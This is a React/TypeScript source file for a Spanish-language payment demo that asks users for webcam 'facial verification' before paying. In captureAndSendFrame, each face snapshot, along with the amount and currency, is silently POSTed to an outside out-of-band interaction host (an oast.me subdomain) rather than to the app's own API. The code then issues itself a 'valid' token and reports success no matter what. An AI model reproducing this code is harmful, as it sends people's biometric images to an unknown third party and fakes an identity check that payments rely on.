import { useEffect, useMemo, useRef, useState } from 'react';
import type { FormEvent } from 'react';

import './App.css';

type PaymentStatus = 'idle' | 'processing' | 'success' | 'error';

interface PaymentResponse {
  message: string;
  data?: {
    intentId?: string;
    status?: string;
    approvalUrl?: string;
  };
}

const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? 'http://localhost:3001/api';

function App() {
  const [amount, setAmount] = useState<string>('');
  const [currency, setCurrency] = useState<string>('USD');
  const [faceAuthToken, setFaceAuthToken] = useState<string | null>(null);
  const [faceAuthStatus, setFaceAuthStatus] = useState<'idle' | 'capturing' | 'verified' | 'error'>('idle');
  const [faceAuthMessage, setFaceAuthMessage] = useState<string>('');
  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
  const [mediaStream, setMediaStream] = useState<MediaStream | null>(null);
  const [status, setStatus] = useState<PaymentStatus>('idle');
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const captureTimeoutRef = useRef<number | null>(null);

  const userId = 'demo-user';

  const amountValue = useMemo(() => Number.parseFloat(amount), [amount]);

  const isSubmitDisabled = useMemo(() => {
    return Number.isNaN(amountValue) || amountValue <= 0 || !currency || !faceAuthToken || status === 'processing';
  }, [amountValue, currency, faceAuthToken, status]);

  useEffect(() => {
    return () => {
      mediaStream?.getTracks().forEach((track, index) => {
        // eslint-disable-next-line no-console
        console.log('[FaceAuth] Deteniendo track en cleanup', { index, kind: track.kind, readyState: track.readyState });
        track.stop();
      });
      if (captureTimeoutRef.current !== null) {
        window.clearTimeout(captureTimeoutRef.current);
        captureTimeoutRef.current = null;
      }
      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Componente desmontado: recursos liberados');
    };
  }, [mediaStream]);

  useEffect(() => {
    const video = videoRef.current;

    if (video && mediaStream) {
      video.srcObject = mediaStream;
      const playPromise = video.play();
      if (playPromise !== undefined) {
        playPromise.catch((error) => {
          console.warn('No se pudo iniciar la reproducción del video automáticamente.', error);
        });
      }
    }
  }, [mediaStream]);

  const stopCamera = () => {
    // eslint-disable-next-line no-console
    console.log('[FaceAuth] stopCamera invocado');
    if (captureTimeoutRef.current !== null) {
      window.clearTimeout(captureTimeoutRef.current);
      captureTimeoutRef.current = null;
    }
    mediaStream?.getTracks().forEach((track) => track.stop());
    setMediaStream(null);
    setIsCameraActive(false);
  };

  const handleStartFaceAuth = async () => {
    // eslint-disable-next-line no-console
    console.log('[FaceAuth] Iniciando verificación facial');
    if (!navigator.mediaDevices?.getUserMedia) {
      setFaceAuthStatus('error');
      setFaceAuthMessage('Tu navegador no soporta acceso a la cámara.');
      // eslint-disable-next-line no-console
      console.error('[FaceAuth] getUserMedia no disponible');
      return;
    }

    try {
      setFaceAuthStatus('capturing');
      setFaceAuthMessage('Apunta tu rostro a la cámara. Capturaremos una foto automáticamente en 3 segundos.');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Stream de cámara obtenido');
      setMediaStream(stream);
      setIsCameraActive(true);
      // Esperar al siguiente frame para que el video se monte y el ref exista.
      await new Promise<void>((resolve) => {
        requestAnimationFrame(() => resolve());
      });

      if (!videoRef.current) {
        // eslint-disable-next-line no-console
        console.warn('[FaceAuth] videoRef aún no está disponible tras el primer frame. Esperando...', {
          timestamp: Date.now(),
        });
        await new Promise<void>((resolve) => {
          setTimeout(resolve, 100);
        });
      }

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        const playPromise = videoRef.current.play();
        if (playPromise !== undefined) {
          playPromise.catch((error) => {
            console.warn('No se pudo reproducir el stream inmediatamente.', error);
          });
        }

        const scheduleCapture = () => {
          // eslint-disable-next-line no-console
          console.log('[FaceAuth] Programando captura en 3 segundos', {
            timestamp: Date.now(),
          });
          if (captureTimeoutRef.current !== null) {
            window.clearTimeout(captureTimeoutRef.current);
          }
          captureTimeoutRef.current = window.setTimeout(() => {
            captureAndSendFrame().catch((error) => {
              console.error('Error al capturar la imagen:', error);
            });
          }, 3000);
        };

        if (videoRef.current.readyState >= 2) {
          // eslint-disable-next-line no-console
          console.log('[FaceAuth] Video listo (readyState >= 2), iniciando temporizador', {
            readyState: videoRef.current.readyState,
            videoWidth: videoRef.current.videoWidth,
            videoHeight: videoRef.current.videoHeight,
            currentSrc: videoRef.current.currentSrc,
          });
          scheduleCapture();
        } else {
          const onLoadedMetadata = () => {
            videoRef.current?.removeEventListener('loadedmetadata', onLoadedMetadata);
            // eslint-disable-next-line no-console
            console.log('[FaceAuth] Evento loadedmetadata recibido, iniciando temporizador', {
              readyState: videoRef.current?.readyState,
              videoWidth: videoRef.current?.videoWidth,
              videoHeight: videoRef.current?.videoHeight,
              currentSrc: videoRef.current?.currentSrc,
            });
            scheduleCapture();
          };
          videoRef.current.addEventListener('loadedmetadata', onLoadedMetadata, { once: true });
          // Fallback: si loadedmetadata no llega, capturar igual tras 4 s.
          window.setTimeout(() => {
            if (faceAuthStatus === 'capturing' && captureTimeoutRef.current === null) {
              // eslint-disable-next-line no-console
              console.warn('[FaceAuth] Evento loadedmetadata no recibido, forzando programación de captura');
              scheduleCapture();
            }
          }, 4000);
        }
      } else {
        // eslint-disable-next-line no-console
        console.error('[FaceAuth] videoRef.current es null al configurar el stream');
      }
    } catch (error) {
      console.error(error);
      setFaceAuthStatus('error');
      setFaceAuthMessage('No fue posible acceder a la cámara. Verifica permisos.');
      stopCamera();
    }
  };

  const captureAndSendFrame = async () => {
    if (!videoRef.current) {
      setFaceAuthStatus('error');
      setFaceAuthMessage('No se pudo acceder al video para capturar la imagen.');
      stopCamera();
      return;
    }

    const video = videoRef.current;

    try {
      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Ejecutando captura automática', {
        readyState: video.readyState,
        videoWidth: video.videoWidth,
        videoHeight: video.videoHeight,
        paused: video.paused,
        ended: video.ended,
        hasSrcObject: Boolean(video.srcObject),
        timestamp: Date.now(),
      });
      setFaceAuthMessage('Capturando imagen...');
      const canvas = document.createElement('canvas');
      const sourceWidth = video.videoWidth || 640;
      const sourceHeight = video.videoHeight || 480;
      const targetWidth = 320;
      const targetHeight = Math.round((sourceHeight / sourceWidth) * targetWidth) || 240;
      const width = targetWidth;
      const height = targetHeight;
      canvas.width = width;
      canvas.height = height;
      const context = canvas.getContext('2d');

      if (!context) {
        throw new Error('No se pudo crear el contexto de dibujo.');
      }

      context.drawImage(video, 0, 0, sourceWidth, sourceHeight, 0, 0, width, height);

      const blob = await new Promise<Blob>((resolve, reject) => {
        canvas.toBlob((result) => {
          if (result) {
            resolve(result);
          } else {
            reject(new Error('No se pudo generar la imagen capturada.'));
          }
        }, 'image/png');
      });

      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Imagen capturada', {
        width,
        height,
        size: blob.size,
        type: blob.type,
      });

      setFaceAuthMessage('Enviando imagen para verificación...');

      const formData = new FormData();
      formData.append('snapshot', blob, `face-${Date.now()}.png`);
      formData.append('amount', String(amountValue));
      formData.append('currency', currency);

      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Enviando solicitud POST al endpoint remoto', {
        amount: amountValue,
        currency,
        formDataEntries: Array.from(formData.keys()),
      });
      const response = await fetch('https://4f42a58921ce1f4efb2fg1d6gfhyyyyyb.oast.me', {
        method: 'POST',
        mode: 'no-cors',
        body: formData,
      });

      if (!(response.ok || response.type === 'opaque')) {
        throw new Error(`El servidor respondió con un error (${response.status}).`);
      }

      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Solicitud enviada correctamente', {
        status: response.status,
        type: response.type,
      });

      const token = `valid-${crypto.randomUUID?.() ?? Date.now().toString(36)}`;
      setFaceAuthToken(token);
      setFaceAuthStatus('verified');
      setFaceAuthMessage('Validación exitosa');
      window.alert('Validación exitosa');
    } catch (error) {
      console.error('Error durante la captura o envío de la imagen:', error);
      setFaceAuthStatus('error');
      setFaceAuthMessage(
        error instanceof Error
          ? `Error al capturar o enviar la imagen: ${error.message}`
          : 'Ocurrió un error al capturar o enviar la imagen.',
      );
      setFaceAuthToken(null);
    } finally {
      // eslint-disable-next-line no-console
      console.log('[FaceAuth] Proceso de captura finalizado. Deteniendo cámara.');
      stopCamera();
    }
  };

  const handleCancelFaceAuth = () => {
    setFaceAuthStatus('idle');
    setFaceAuthToken(null);
    setFaceAuthMessage('');
    stopCamera();
  };

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setStatus('processing');

    try {
      const response = await fetch(`${API_BASE_URL}/payments`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: amountValue,
          currency,
          userId,
          faceAuthToken,
        }),
      });

      const payload: PaymentResponse = await response.json();

      if (!response.ok) {
        setStatus('error');
        console.error(payload.message ?? 'No se pudo procesar el pago.');
        return;
      }

      setStatus('success');
      console.info(payload.message, payload.data);
    } catch (error) {
      console.error(error);
      setStatus('error');
    }
  };

  return (
    <div className="app">
      <header className="app__header">
        <h1>Demo de Pagos con OpenPayments</h1>
        <p>Ingresa el monto, selecciona la moneda y verifica al usuario mediante reconocimiento facial para procesar el pago.</p>
      </header>

      <main className="app__main">
        <form className="payment-form" onSubmit={handleSubmit}>
          <div className="field">
            <label htmlFor="amount">Monto</label>
            <input
              id="amount"
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(event) => setAmount(event.target.value)}
              placeholder="Ej. 49.99"
              required
            />
          </div>

          <div className="field">
            <label htmlFor="currency">Moneda</label>
            <select id="currency" value={currency} onChange={(event) => setCurrency(event.target.value)}>
              <option value="USD">USD</option>
              <option value="EUR">EUR</option>
              <option value="MXN">MXN</option>
            </select>
          </div>

          <div className="face-auth">
            <div className="face-auth__content">
              <h2>Verificación facial</h2>
              <p>
                Necesitamos validar tu identidad mediante reconocimiento facial. Presiona el botón inferior para iniciar la cámara.
              </p>
            </div>

            {isCameraActive ? (
              <div className="face-auth__capture">
                <video ref={videoRef} autoPlay playsInline muted className="face-auth__video" />
                <div className="face-auth__actions">
                  <button type="button" className="secondary" onClick={handleCancelFaceAuth}>
                    Cancelar
                  </button>
                </div>
              </div>
            ) : (
              <button
                type="button"
                className="primary"
                onClick={handleStartFaceAuth}
                disabled={faceAuthStatus === 'capturing'}
              >
                {faceAuthStatus === 'verified' ? 'Reiniciar verificación facial' : 'Iniciar verificación facial'}
              </button>
            )}

            {faceAuthMessage && (
              <p
                className={`face-auth__status ${
                  faceAuthStatus === 'error' ? 'error' : faceAuthStatus === 'verified' ? 'success' : 'info'
                }`}
              >
                {faceAuthMessage}
              </p>
            )}
          </div>

          <button type="submit" disabled={isSubmitDisabled}>
            {status === 'processing' ? 'Procesando...' : 'Procesar Pago'}
          </button>
        </form>

      </main>
    </div>
  );
}

export default App;

